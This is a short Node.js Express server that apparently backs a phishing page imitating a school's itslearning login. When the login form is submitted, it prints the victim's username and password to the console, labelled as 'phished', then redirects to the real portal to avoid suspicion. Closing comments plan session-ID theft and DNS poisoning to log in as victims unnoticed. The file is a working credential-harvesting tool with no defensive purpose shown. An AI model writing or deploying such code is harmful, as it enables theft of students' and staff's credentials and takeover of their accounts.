const express = require("express");
const app = express();
const bodyParser = require("body-parser");
const port = 3000;
const path = require("path");
const chalk = require("chalk");

const redirectwebsite = "https://rfk.itslearning.com/main.aspx?TextURL=CourseCards";
        //Might raise some sus bcuz if the person has not logged in a while they will be redirected back screen before the login.

app.use(bodyParser.urlencoded({ extended: false }));

app.use(express.static(__dirname));

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, "main.html"));
  });

app.post('/login', (req, res)=>{
    console.log(chalk.green("###########################################"));
    console.log(chalk.green("Username phished: ") + req.body.username);
    console.log(chalk.green("Password phished: ") + req.body.password);
    console.log(chalk.green("###########################################"));
    res.redirect(redirectwebsite);
});
app.listen(port, () => {
    console.log(`Running on port : ${port}`)
})



/*
Perhaps, possible to grab jsessionid, then something like dns-poison, then use the redirect using the credentials, and jsessionid to log in?
No-one would notice anything.
*/